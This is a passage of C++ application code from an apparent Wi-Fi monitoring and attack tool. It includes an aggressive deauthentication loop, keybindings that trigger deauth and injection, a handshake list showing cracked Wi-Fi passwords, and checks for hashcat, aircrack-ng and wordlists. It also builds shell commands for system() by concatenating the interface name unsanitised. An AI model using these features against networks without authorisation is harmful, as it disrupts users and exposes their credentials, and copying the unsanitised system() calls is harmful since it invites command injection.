    aggr_target_label_ = n ? (n->alias.empty() ? n->label : n->alias) : "?";

    send_deauth(target);
    std::fprintf(stderr, "[aggr] deauth → %s  (%d/%zu)\n",
                 aggr_target_label_.c_str(), aggr_ap_idx_ + 1, aps.size());

    aggr_ap_idx_ = (aggr_ap_idx_ + 1) % static_cast<int>(aps.size());
    aggr_next_us_ = now + AGGR_DWELL_US;
}

void App::apply_selection_channel_lock(NodeId selected) {
    if (!hopper_) return;
    int lock_ch = 0;
    uint8_t lock_ht = 0;
    if (selected != 0) {
        const Node* n = graph_.get_node(selected);
        if (n) {
            const Node* ap_node = nullptr;
            if (n->type == NodeType::AP) {
                lock_ch = n->channel;
                ap_node = n;
            } else if (n->type == NodeType::SSID) {
                for (auto& e : graph_.edges()) {
                    if (e.type == EdgeType::Broadcasts && e.b == selected) {
                        ap_node = graph_.get_node(e.a);
                        if (ap_node) { lock_ch = ap_node->channel; break; }
                    }
                }
            } else if (n->type == NodeType::Client) {
                uint32_t best = 0;
                for (auto& e : graph_.edges()) {
                    if (e.type == EdgeType::AssociatedWith &&
                        (e.a == selected || e.b == selected) && e.count >= best) {
                        NodeId apid = (e.a == selected) ? e.b : e.a;
                        const Node* ap = graph_.get_node(apid);
                        if (ap && ap->type == NodeType::AP && ap->channel > 0) {
                            lock_ch = ap->channel;
                            best = e.count;
                            ap_node = ap;
                        }
                    }
                }
            }
            if (ap_node) lock_ht = ap_node->chan_ht_oper;
        }
    }
    if (lock_ch > 0) {
        if (!hopper_->lock_channel(lock_ch, lock_ht))
            push_warning("Channel lock failed (ch " + std::to_string(lock_ch) + ")");
    } else if (hopping_enabled_) {
        hopper_->unlock();
    }
}

void App::toggle_channel_hopping() {
    if (!hopper_) hopper_ = std::make_unique<ChannelHopper>();
    if (hopping_enabled_) {
        hopper_->stop();
        hopping_enabled_ = false;
        SDL_SetWindowTitle(window_, "air-ledger");
    } else {
        hopper_->start(iface_name_, hop_dwell_ms_);
        hopping_enabled_ = true;
    }
}

void App::reset_iface() {
    push_warning("Resetting " + iface_name_ + "...");

    // Stop hopper first
    bool was_hopping = hopping_enabled_;
    if (hopping_enabled_ && hopper_) {
        hopper_->stop();
        hopping_enabled_ = false;
        SDL_SetWindowTitle(window_, "air-ledger");
    }

    // Stop pcap capture and join capture thread
    if (capture_) capture_->stop();
    if (capture_thread_.joinable()) capture_thread_.join();
    capture_.reset();

    // Bring the interface down, restore monitor mode, then bring up
    {
        struct timespec ts300{0, 300'000'000};
        const char* iw = iw_bin();
        std::string dn  = "ip link set " + iface_name_ + " down 2>/dev/null";
        std::string mon = std::string(iw) + " dev " + iface_name_ + " set type monitor 2>/dev/null";
        std::string up  = "ip link set " + iface_name_ + " up 2>/dev/null";
        system(dn.c_str());
        nanosleep(&ts300, nullptr);
        system(mon.c_str());   // restore monitor mode (may fail if already in correct state)
        system(up.c_str());
        nanosleep(&ts300, nullptr);
    }

    // Re-open capture
    capture_ = std::make_unique<PcapSource>();
    bool ok = capture_->open(iface_name_, [this](RawFrame f) {
        std::lock_guard<std::mutex> lk(frame_queue_mutex_);
        if (frame_queue_.size() < 5000)
            frame_queue_.push(std::move(f));
    });

    if (ok) {
        capture_thread_ = std::thread([this]() { capture_->start(); });
        if (was_hopping && hopper_) {
            hopper_->start(iface_name_, hop_dwell_ms_);
            hopping_enabled_ = true;
        }
        push_warning("Interface reset OK");
        std::fprintf(stderr, "[app] interface reset: %s\n", iface_name_.c_str());
    } else {
        push_error("Interface reset FAILED: " + iface_name_);
        std::fprintf(stderr, "[app] interface reset FAILED: %s\n", iface_name_.c_str());
    }
}

void App::start_alias_input(NodeId target) {
    alias_target_ = target;
    const Node* n = graph_.get_node(target);
    alias_buf_ = n ? n->alias : "";
    alias_mode_ = true;
    SDL_StartTextInput();
}

void App::confirm_alias() {
    if (alias_target_ != 0) {
        graph_.set_alias(alias_target_, alias_buf_);
        const Node* n = graph_.get_node(alias_target_);
        if (n) db_.set_alias(n->label, alias_buf_);
    }
    cancel_alias();
}

void App::cancel_alias() {
    alias_mode_ = false;
    alias_buf_.clear();
    alias_target_ = 0;
    SDL_StopTextInput();
}

void App::toggle_filter_active() {
    filter_.active_only = !filter_.active_only;
}

void App::toggle_filter_randomized() {
    filter_.randomized_only = !filter_.randomized_only;
}

void App::toggle_filter_probe_only() {
    filter_.probe_only = !filter_.probe_only;
    if (filter_.probe_only)
        filter_.handshake_clients_only = false;  // mutually exclusive
}

void App::refresh_hs_list() {
    using Entry  = GraphView::HandshakeListEntry;
    using Status = Entry::Status;
    using JS     = CrackJob::Status;

    std::vector<Entry> entries;

    for (auto& [cid, cn] : graph_.nodes()) {
        if (cn.type != NodeType::Client || !cn.has_handshake) continue;

        for (NodeId apid : cn.handshake_aps) {
            const Node* an = graph_.get_node(apid);
            if (!an) continue;

            Entry e;
            e.client_id  = cid;
            e.ap_id      = apid;
            e.client_mac = cn.label;
            e.ap_bssid   = an->label;

            // Resolve SSID name
            if (an->ssid_id != 0) {
                const Node* sn = graph_.get_node(an->ssid_id);
                if (sn) e.ap_ssid = sn->label;
            }

            // 1. Live crack job (highest priority — reflects current session state)
            const CrackJob* job = handshake_saver_.find_job_ro(an->label);
            if (job) {
                e.spin_frame = job->spin_frame;
                switch (job->status) {
                    case JS::Queued:   e.status = Status::Queued;   break;
                    case JS::Running:  e.status = Status::Running;  break;
                    case JS::Found:    e.status = Status::Found;    e.password = job->password; break;
                    case JS::NotFound: e.status = Status::NotFound; break;
                }
            } else if (!an->passwords.empty()) {
                // 2. Password already in memory (loaded from DB or found this session)
                e.status   = Status::Found;
                e.password = an->passwords.front();
            } else {
                // 3. Fall back to persisted crack_status from DB
                std::string db_status, db_pass;
                if (db_.get_handshake_crack(an->label, db_status, db_pass)) {
                    if (db_status == "found") {
                        e.status   = Status::Found;
                        e.password = db_pass;
                    } else if (db_status == "not_found") {
                        e.status = Status::NotFound;
                    } else {
                        e.status = Status::Saved;
                    }
                } else {
                    e.status = Status::Saved;
                }
            }

            entries.push_back(std::move(e));
        }
    }

    // Sort: Found first, then by status, then alphabetically by SSID
    std::sort(entries.begin(), entries.end(), [](const Entry& a, const Entry& b) {
        if (a.status != b.status) return static_cast<int>(a.status) < static_cast<int>(b.status);
        return a.ap_ssid < b.ap_ssid;
    });

    graph_view_.set_hs_list(entries);
}

void App::start_search() {
    search_mode_ = true;
    SDL_StartTextInput();
}

void App::cancel_search() {
    search_mode_ = false;
    filter_.search_query.clear();
    SDL_StopTextInput();
}

void App::export_json(NodeId focus) {
    auto now = std::chrono::system_clock::now();
    auto t = std::chrono::system_clock::to_time_t(now);
    char fname[64];
    std::strftime(fname, sizeof(fname), "air-ledger-%Y%m%d-%H%M%S.json", std::localtime(&t));

    std::ofstream f(fname);
    if (!f) {
        std::fprintf(stderr, "[export] Cannot open %s\n", fname);
        return;
    }

    // Collect which nodes to export
    std::unordered_set<NodeId> export_nodes;
    if (focus == 0) {
        for (auto& [id, n] : graph_.nodes()) export_nodes.insert(id);
    } else {
        export_nodes.insert(focus);
        for (auto& e : graph_.edges()) {
            if (e.a == focus) export_nodes.insert(e.b);
            if (e.b == focus) export_nodes.insert(e.a);
        }
    }

    // Trim trailing newline from ctime
    char time_str[64];
    std::strftime(time_str, sizeof(time_str), "%Y-%m-%dT%H:%M:%S", std::localtime(&t));

    f << "{\n";
    f << "  \"exported_at\": \"" << time_str << "\",\n";

    f << "  \"nodes\": [\n";
    bool first_n = true;
    for (auto& [id, n] : graph_.nodes()) {
        if (!export_nodes.count(id)) continue;
        if (!first_n) f << ",\n";
        first_n = false;
        auto type_str = [](NodeType t) -> const char* {
            switch(t) {
                case NodeType::Client:   return "client";
                case NodeType::AP:       return "ap";
                case NodeType::SSID:     return "ssid";
                default:                 return "location";
            }
        };
        f << "    {\"id\":" << id
          << ",\"type\":\"" << type_str(n.type) << "\""
          << ",\"label\":\"" << n.label << "\""
          << ",\"alias\":\"" << n.alias << "\""
          << ",\"vendor\":\"" << n.vendor << "\""
          << ",\"is_randomized\":" << (n.is_randomized ? "true" : "false")
          << ",\"seen_count\":" << n.seen_count
          << ",\"last_rssi\":" << static_cast<int>(n.last_rssi)
          << ",\"first_seen\":" << n.first_seen
          << ",\"last_seen\":" << n.last_seen
          << "}";
    }
    f << "\n  ],\n";

    f << "  \"edges\": [\n";
    bool first_e = true;
    for (auto& e : graph_.edges()) {
        if (!export_nodes.count(e.a) || !export_nodes.count(e.b)) continue;
        if (!first_e) f << ",\n";
        first_e = false;
        auto etype_str = [](EdgeType t) -> const char* {
            switch(t) {
                case EdgeType::ProbesFor:  return "probes_for";
                case EdgeType::Broadcasts: return "broadcasts";
                case EdgeType::SeenNear:   return "seen_near";
                case EdgeType::SimilarTo:  return "similar_to";
                default:                   return "unknown";
            }
        };
        f << "    {\"a\":" << e.a
          << ",\"b\":" << e.b
          << ",\"type\":\"" << etype_str(e.type) << "\""
          << ",\"weight\":" << e.weight
          << ",\"count\":" << e.count
          << "}";
    }
    f << "\n  ]\n}\n";

    std::fprintf(stderr, "[export] Saved %s (%zu nodes)\n", fname, export_nodes.size());
}

// ---------------------------------------------------------------------------
// Startup diagnostic checks
// ---------------------------------------------------------------------------

void App::check_startup() {
    startup_warnings_.clear();
    std::string hc = resolve_tool("AIR_LEDGER_HASHCAT_BIN", "hashcat");
    std::string ac = resolve_tool("AIR_LEDGER_AIRCRACK_BIN", "aircrack-ng");
    std::string ar = resolve_tool("AIR_LEDGER_AIREPLAY_BIN", "aireplay-ng");
    std::string iw = resolve_tool("AIR_LEDGER_IW_BIN", "iw");

    // pcap file playback — skip live-interface checks
    auto ends_with = [](const std::string& s, const std::string& suffix) {
        return s.size() >= suffix.size() &&
               s.compare(s.size() - suffix.size(), suffix.size(), suffix) == 0;
    };
    bool is_pcap_file = ends_with(iface_name_, ".pcap") ||
                        ends_with(iface_name_, ".pcapng");

    if (!is_pcap_file && !iface_name_.empty()) {
        char path[128];

        // 1. Monitor mode — ARPHRD type: 803=radiotap monitor, 801=monitor (both OK)
        std::snprintf(path, sizeof(path),
                      "/sys/class/net/%s/type", iface_name_.c_str());
        FILE* f = std::fopen(path, "r");
        if (!f) {
            startup_warnings_.push_back("Interface not found: " + iface_name_);
        } else {
            int arphrd = 0;
            std::fscanf(f, "%d", &arphrd);
            std::fclose(f);
            if (arphrd != 803 && arphrd != 801) {
                startup_warnings_.push_back(
                    "Interface '" + iface_name_ + "' is NOT in monitor mode"
                    " (type=" + std::to_string(arphrd) + "). "
                    "Run: iw dev " + iface_name_ + " set type monitor");
            }
        }

        // 2. Operstate — should be 'up' or 'unknown' (some drivers report 'unknown' in monitor)
        std::snprintf(path, sizeof(path),
                      "/sys/class/net/%s/operstate", iface_name_.c_str());
        f = std::fopen(path, "r");
        if (f) {
            char state[32] = {};
            std::fgets(state, sizeof(state), f);
            std::fclose(f);
            size_t n = std::strlen(state);
            while (n > 0 && (state[n-1] == '\n' || state[n-1] == '\r')) state[--n] = '\0';
            if (std::strcmp(state, "up") != 0 && std::strcmp(state, "unknown") != 0) {
                startup_warnings_.push_back(
                    "Interface '" + iface_name_ + "' is down (operstate=" +
                    std::string(state) + "). "
                    "Run: ip link set " + iface_name_ + " up");
            }
        }

        // 3. Privileges — pcap needs root or CAP_NET_RAW
        if (::getuid() != 0) {
            startup_warnings_.push_back(
                "Not running as root. Packet capture requires root or CAP_NET_RAW.");
        }

        // 4. Passive monitor/injection readiness probe via pcap linktype.
        char errbuf[PCAP_ERRBUF_SIZE]{};
        pcap_t* p = pcap_open_live(iface_name_.c_str(), 256, 1, 100, errbuf);
        if (!p) {
            startup_warnings_.push_back(
                "pcap open failed on '" + iface_name_ + "': " + std::string(errbuf));
        } else {
            int dlt = pcap_datalink(p);
            if (dlt != DLT_IEEE802_11_RADIO && dlt != DLT_IEEE802_11) {
                startup_warnings_.push_back(
                    "Interface '" + iface_name_ + "' linktype=" + std::to_string(dlt)
                    + " (expected radiotap/802.11 for monitor+inject)");
            }
            pcap_close(p);
        }
    }

    // 5. Capture thread not started — open() failed
    if (!capture_thread_.joinable()) {
        startup_warnings_.push_back(
            "Capture failed to open on '" + iface_name_ +
            "'. Check interface name and permissions.");
    }

    // 6. External tools and crack backends.
    if (tool_missing(iw))
        startup_warnings_.push_back("Tool missing: iw (channel lock / hopper reset will fail)");
    if (tool_missing(ar))
        startup_warnings_.push_back("Tool missing: aireplay-ng (external deauth unavailable)");
    if (tool_missing(ac) && !builtin_cracker_available())
        startup_warnings_.push_back("No CPU cracker available: both builtin OpenSSL and aircrack-ng are unavailable");
#ifdef HAVE_GPU_CRACK
    if (tool_missing(hc))
        startup_warnings_.push_back("Tool missing: hashcat (GPU cracking will fall back)");
#else
    if (!tool_missing(hc))
        startup_warnings_.push_back("hashcat binary exists, but this build has GPU crack support disabled");
#endif

    // 7. Wordlists missing (if handshake capture configured)
    for (const auto& wl : startup_wordlists_) {
        if (::access(wl.c_str(), R_OK) != 0) {
            startup_warnings_.push_back("Wordlist not found: " + wl);
        }
    }
    if (handshake_saver_.is_active() && startup_wordlists_.empty()) {
        startup_warnings_.push_back(
            "Handshake capture enabled but no --wordlist specified. "
            "Handshakes will be saved but not cracked.");
    }

    startup_dialog_open_ = !startup_warnings_.empty();
}

void App::render_startup_dialog(int w, int h) {
    if (!renderer_ || !font_) return;

    int lh  = TTF_FontHeight(font_) + 2;
    int pad = std::max(4, w / 50); // ~8px on 400px screen, ~20px on 1000px
    int max_text_w = w - pad * 2 - 4;
    bool compact = (w <= 500 || h <= 300 || is_beepy_profile(ui_profile_));

    // Full-screen background
    SDL_SetRenderDrawColor(renderer_, 10, 10, 18, 255);
    SDL_Rect full{0, 0, w, h};
    SDL_RenderFillRect(renderer_, &full);

    // Orange border
    SDL_SetRenderDrawColor(renderer_, 220, 100, 0, 255);
    SDL_RenderDrawRect(renderer_, &full);
    SDL_Rect inner{1, 1, w - 2, h - 2};
    SDL_RenderDrawRect(renderer_, &inner);

    // Render one line of text, return actual pixel height used
    auto render_text = [&](const std::string& text, int x, int y, SDL_Color col) -> int {
        if (text.empty()) return lh;
        SDL_Surface* s = TTF_RenderUTF8_Blended(font_, text.c_str(), col);
        if (!s) return lh;
        SDL_Texture* t = SDL_CreateTextureFromSurface(renderer_, s);
        int tw = s->w, th = s->h;
        SDL_FreeSurface(s);
        if (!t) return lh;
        SDL_Rect dst{x, y, tw, th};
        SDL_RenderCopy(renderer_, t, nullptr, &dst);
        SDL_DestroyTexture(t);
        return th + 2;
    };

    // Word-wrap: split `text` into lines that fit within max_text_w pixels.
    // Returns list of wrapped lines.
    auto wrap_text = [&](const std::string& text) -> std::vector<std::string> {
        std::vector<std::string> lines;
        std::string current;
        std::istringstream ss(text);
        std::string word;
        while (ss >> word) {
            std::string candidate = current.empty() ? word : current + " " + word;
            int tw = 0, th = 0;
            TTF_SizeUTF8(font_, candidate.c_str(), &tw, &th);
            if (tw <= max_text_w) {
                current = std::move(candidate);
            } else {
                if (!current.empty()) lines.push_back(current);
                current = word;
            }
        }
        if (!current.empty()) lines.push_back(current);
        if (lines.empty()) lines.push_back("");
        return lines;
    };

    auto compact_warn = [&](const std::string& warn) {
        if (!compact) return warn;
        std::string s = warn;
        auto replace_once = [&](const char* from, const char* to) {
            size_t p = s.find(from);
            if (p != std::string::npos) s.replace(p, std::strlen(from), to);
        };
        replace_once("Interface '", "IF ");
        replace_once("' is NOT in monitor mode", " not monitor");
        replace_once("Run: iw dev ", "fix: iw ");
        replace_once(" set type monitor", " set type monitor");
        replace_once("Not running as root. Packet capture requires root or CAP_NET_RAW.", "Need root/CAP_NET_RAW");
        replace_once("Capture failed to open on '", "Capture open failed: ");
        replace_once("'. Check interface name and permissions.", "");
        replace_once("Tool missing: ", "");
        replace_once(" (channel lock / hopper reset will fail)", " missing");
        replace_once(" (external deauth unavailable)", " missing");
        replace_once("No CPU cracker available: both builtin OpenSSL and aircrack-ng are unavailable", "No CPU cracker");
        replace_once("Handshake capture enabled but no --wordlist specified. Handshakes will be saved but not cracked.",
                     "No wordlist: save only");
        replace_once("hashcat binary exists, but this build has GPU crack support disabled",
                     "hashcat present, GPU build off");
        if (s.size() > 64) s = s.substr(0, 63) + "~";
        return s;
    };

    int tx = pad + 2;
    int y  = pad;

    // Title
    y += render_text(compact ? "Startup Check" : "Startup Diagnostics", tx, y, {255, 140, 0, 255});
    SDL_SetRenderDrawColor(renderer_, 150, 70, 0, 255);
    SDL_RenderDrawLine(renderer_, pad, y, w - pad, y);
    y += 4;

    // Warnings with word-wrap
    int footer_h = lh + 10;
    int shown_warnings = 0;
    int hidden_warnings = 0;
    int max_warnings = compact ? 7 : 1000;
    for (const auto& raw_warn : startup_warnings_) {
        if (shown_warnings >= max_warnings) {
            ++hidden_warnings;
            continue;
        }
        auto lines = wrap_text("! " + compact_warn(raw_warn));
        for (size_t i = 0; i < lines.size(); ++i) {
            if (y + lh > h - footer_h) break; // don't overlap footer
            SDL_Color col = (i == 0) ? SDL_Color{255, 220, 60, 255}
                                     : SDL_Color{200, 180, 50, 255};
            // indent continuation lines
            int indent = (i > 0) ? pad : 0;
            y += render_text(lines[i], tx + indent, y, col);
        }
        y += 2;
        ++shown_warnings;
    }
    if (hidden_warnings > 0 && y + lh <= h - footer_h) {
        y += render_text("! +" + std::to_string(hidden_warnings) + " more in log", tx, y,
                         {180, 180, 180, 255});
    }

    // Footer pinned to bottom
    int fy = h - lh - 6;
    SDL_SetRenderDrawColor(renderer_, 60, 60, 60, 255);
    SDL_RenderDrawLine(renderer_, pad, fy - 4, w - pad, fy - 4);
    render_text(compact ? "Enter/Esc: close" : "ESC / Enter — dismiss", tx, fy, {120, 120, 120, 255});
}

void App::run() {
    constexpr int TARGET_FPS = 30;
    constexpr uint64_t FRAME_US = 1'000'000 / TARGET_FPS;
    constexpr uint64_t ANALYTICS_INTERVAL_US = 10'000'000; // 10 sec
    constexpr uint64_t DB_FLUSH_INTERVAL_US  =  5'000'000; //  5 sec
    constexpr uint64_t ACTIVE_MARK_INTERVAL_US = 2'000'000; // 2 sec
    constexpr uint64_t PRUNE_INTERVAL_US = 30'000'000; // 30 sec

    // Run startup diagnostics — checks monitor mode, permissions, capture status
    check_startup();

    // Use window surface size — SDL_GetWindowSize returns 0 on KMS/DRM (Beepy)
    // until the compositor sends a resize event; surface->w/h is always correct.
    SDL_Surface* init_surf = SDL_GetWindowSurface(window_);
    int cur_w = (init_surf && init_surf->w > 1) ? init_surf->w : WIN_W;
    int cur_h = (init_surf && init_surf->h > 1) ? init_surf->h : WIN_H;
    NodeId selected_node = 0;
    uint64_t last_prune_us = 0;

    while (running_.load()) {
        uint64_t frame_start = now_us();

        // Handle SDL events
        SDL_Event ev;
        while (SDL_PollEvent(&ev)) {
            if (ev.type == SDL_QUIT) { stop(); break; }
            if (ev.type == SDL_WINDOWEVENT) {
                if (ev.window.event == SDL_WINDOWEVENT_RESIZED ||
                    ev.window.event == SDL_WINDOWEVENT_SIZE_CHANGED) {
                    // Recreate SoftwareRenderer on the new window surface
                    if (renderer_) { SDL_DestroyRenderer(renderer_); renderer_ = nullptr; }
                    SDL_Surface* surf = SDL_GetWindowSurface(window_);
                    if (surf) {
                        // Use surface physical dimensions — ev.window.data1/data2 are
                        // logical pixels on HiDPI displays and may not match the surface.
                        cur_w = surf->w;
                        cur_h = surf->h;
                        renderer_ = SDL_CreateSoftwareRenderer(surf);
                        if (renderer_) SDL_SetRenderDrawBlendMode(renderer_, SDL_BLENDMODE_BLEND);
                    }
                    graph_view_.set_renderer(renderer_);
                    sidebar_.set_renderer(renderer_);
                    // First valid resize: recalculate font size (window was 1×1 at init)
                    if (!initial_resize_done_ && cur_w > 1 && cur_h > 1) {
                        initial_resize_done_ = true;
                        bool beepy = is_beepy_profile(ui_profile_);
                        font_size_ = autoscaled_font_size(cur_h, beepy);
                        if (font_) { TTF_CloseFont(font_); font_ = nullptr; }
                        load_font();
                        graph_view_.set_font(font_);
                        sidebar_.set_font(font_);
                        std::fprintf(stderr, "[app] initial resize: %dx%d  font: %dpx\n",
                                     cur_w, cur_h, font_size_);
                    }
                    bool beepy = is_beepy_profile(ui_profile_);
                    sidebar_w_ = sidebar_width_for(font_size_, cur_w, cur_h, beepy);
                    int gw = cur_w - sidebar_w_;
                    graph_view_.set_viewport(0, 0, gw, cur_h);
                    layout_.set_bounds(static_cast<float>(gw), static_cast<float>(cur_h));
                }
            }
            if (!startup_dialog_open_ && ev.type == SDL_TEXTINPUT) {
                if (alias_mode_) {
                    alias_buf_ += ev.text.text;
                } else if (search_mode_) {
                    filter_.search_query += ev.text.text;
                }
            }

            if (ev.type == SDL_KEYDOWN) {
                SDL_Keycode sym = ev.key.keysym.sym;

                // Startup dialog: ESC closes it, all other keys ignored while open
                if (startup_dialog_open_) {
                    if (sym == SDLK_ESCAPE || sym == SDLK_RETURN || sym == SDLK_KP_ENTER)
                        startup_dialog_open_ = false;
                    continue;
                }

                if (alias_mode_) {
                    if (sym == SDLK_BACKSPACE) {
                        if (!alias_buf_.empty()) alias_buf_.pop_back();
                    } else if (sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        confirm_alias();
                    } else if (sym == SDLK_ESCAPE) {
                        cancel_alias();
                    }
                } else if (search_mode_) {
                    if (sym == SDLK_BACKSPACE) {
                        if (!filter_.search_query.empty()) filter_.search_query.pop_back();
                    } else if (sym == SDLK_ESCAPE || sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        if (sym == SDLK_ESCAPE) cancel_search();
                        else { search_mode_ = false; SDL_StopTextInput(); }
                    }
                } else if (graph_view_.help_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_i) {
                        graph_view_.toggle_help();
                    } else if (sym == SDLK_UP) {
                        graph_view_.help_move(-1);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.help_move(+1);
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.help_move(shift ? -1 : +1);
                    }
                } else if (graph_view_.crack_list_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_k) {
                        graph_view_.close_crack_list();
                    } else if (sym == SDLK_UP) {
                        graph_view_.crack_list_move(-1);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.crack_list_move(+1);
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.crack_list_move(shift ? -1 : +1);
                    } else if (sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        NodeId sid = graph_view_.sidebar_focus_node(graph_);
                        if (sid) graph_view_.select_and_focus(sid, graph_);
                    }
                } else if (graph_view_.hs_list_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_j) {
                        graph_view_.close_hs_list();
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.hs_list_move(shift ? -1 : +1);
                    } else if (sym == SDLK_UP) {
                        graph_view_.hs_list_move(-1);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.hs_list_move(+1);
                    } else if (sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        NodeId cid = graph_view_.hs_list_select_client();
                        if (cid) {
                            graph_view_.close_hs_list();
                            graph_view_.select_and_focus(cid, graph_);
                        }
                    }
                } else if (graph_view_.event_log_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_y) {
                        graph_view_.close_event_log();
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.event_log_move(shift ? -1 : +1);
                    } else if (sym == SDLK_UP) {
                        graph_view_.event_log_move(-1);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.event_log_move(+1);
                    }
                } else if (graph_view_.ap_list_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_p) {
                        graph_view_.close_ap_list();
                    } else if (sym == SDLK_UP) {
                        graph_view_.ap_list_move(-1, graph_);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.ap_list_move(+1, graph_);
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.ap_list_move(shift ? -1 : +1, graph_);
                    } else if (sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        NodeId ap_id = graph_view_.ap_list_cursor_node(graph_);
                        if (ap_id) {
                            graph_view_.select_and_focus(ap_id, graph_);
                            graph_view_.close_ap_list();
                        }
                    } else if (sym == SDLK_d) {
                        NodeId ap_id = graph_view_.ap_list_cursor_node(graph_);
                        bool ctrl = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                        if (ap_id) {
                            if (ctrl) run_inject_diagnostics(ap_id);
                            else send_deauth(ap_id);
                        }
                    }
                } else if (graph_view_.anomaly_log_visible()) {
                    bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                    bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                    if (sym == SDLK_ESCAPE || sym == SDLK_w) {
                        graph_view_.close_anomaly_log();
                    } else if (sym == SDLK_UP) {
                        graph_view_.anomaly_log_move(-1);
                    } else if (sym == SDLK_DOWN) {
                        graph_view_.anomaly_log_move(+1);
                    } else if (sym == SDLK_TAB) {
                        if (ctrl) sidebar_.cycle_scroll(shift);
                        else graph_view_.anomaly_log_move(shift ? -1 : +1);
                    } else if (sym == SDLK_RETURN || sym == SDLK_KP_ENTER) {
                        NodeId sid = graph_view_.sidebar_focus_node(graph_);
                        if (sid) graph_view_.select_and_focus(sid, graph_);
                    }
                } else {
                    if (sym == SDLK_ESCAPE) { graph_view_.deselect(); }
                    if (sym == SDLK_q)      { stop(); break; }
                    if (sym == SDLK_p)      { graph_view_.toggle_ap_list(); }
                    if (sym == SDLK_k)      { graph_view_.toggle_crack_list(); }
                    if (sym == SDLK_j)      { refresh_hs_list(); graph_view_.toggle_hs_list(); }
                    if (sym == SDLK_TAB) {
                        bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
                        bool ctrl  = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                        if (ctrl) {
                            // Sidebar circular scroll: Ctrl+Tab forward, Ctrl+Shift+Tab backward
                            sidebar_.cycle_scroll(shift);
                        } else {
                            // Tab cycles only AP nodes
                            std::vector<NodeId> ids;
                            for (auto& [id, n] : graph_.nodes())
                                if (n.type == NodeType::AP) ids.push_back(id);
                            std::sort(ids.begin(), ids.end());
                            if (!ids.empty()) {
                                auto it = std::find(ids.begin(), ids.end(), selected_node);
                                if (it == ids.end()) {
                                    graph_view_.select_and_focus(ids[0], graph_);
                                } else if (shift) {
                                    graph_view_.select_and_focus(
                                        it == ids.begin() ? ids.back() : *std::prev(it), graph_);
                                } else {
                                    auto next = std::next(it);
                                    graph_view_.select_and_focus(
                                        next == ids.end() ? ids.front() : *next, graph_);
                                }
                            }
                        }
                    }
                    if (sym == SDLK_d) {
                        const Node* sn = graph_.get_node(selected_node);
                        bool ctrl = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                        if (sn && sn->type == NodeType::AP) {
                            if (ctrl) run_inject_diagnostics(selected_node);
                            else send_deauth(selected_node);
                        }
                    }
                    if (sym == SDLK_h)      { toggle_channel_hopping(); }
                    if (sym == SDLK_F11 && ui_profile_ == UiProfile::Auto) {
                        Uint32 fl = SDL_GetWindowFlags(window_);
                        bool fs = (fl & SDL_WINDOW_FULLSCREEN_DESKTOP) != 0;
                        SDL_SetWindowFullscreen(window_, fs ? 0 : SDL_WINDOW_FULLSCREEN_DESKTOP);
                    }
                    if (sym == SDLK_l)      { graph_view_.toggle_labels(); }
                    if (sym == SDLK_c) {
                        const Node* sn = graph_.get_node(selected_node);
                        if (sn && sn->type == NodeType::AP)
                            graph_view_.toggle_ap_collapse(selected_node);
                        else {
                            filter_.handshake_clients_only = !filter_.handshake_clients_only;
                            if (filter_.handshake_clients_only)
                                filter_.probe_only = false;  // mutually exclusive
                        }
                    }
                    if (sym == SDLK_RIGHTPAREN) { resize_font(+1); }
                    if (sym == SDLK_LEFTPAREN)  { resize_font(-1); }
                    if (sym == SDLK_PLUS || sym == SDLK_EQUALS || sym == SDLK_KP_PLUS) {
                        hop_dwell_ms_ = std::min(hop_dwell_ms_ + 100, 5000);
                        if (hopper_ && hopping_enabled_) hopper_->set_dwell_ms(hop_dwell_ms_);
                    }
                    if (sym == SDLK_MINUS || sym == SDLK_KP_MINUS) {
                        hop_dwell_ms_ = std::max(hop_dwell_ms_ - 100, 100);
                        if (hopper_ && hopping_enabled_) hopper_->set_dwell_ms(hop_dwell_ms_);
                    }
                    if (sym == SDLK_a && selected_node != 0) { start_alias_input(selected_node); }
                    if (sym == SDLK_f)      { toggle_filter_active(); }
                    {
                        bool ctrl = (ev.key.keysym.mod & KMOD_CTRL) != 0;
                        if (sym == SDLK_r) { ctrl ? reset_iface() : toggle_filter_randomized(); }
                    }
                    if (sym == SDLK_o)      { toggle_filter_probe_only(); }
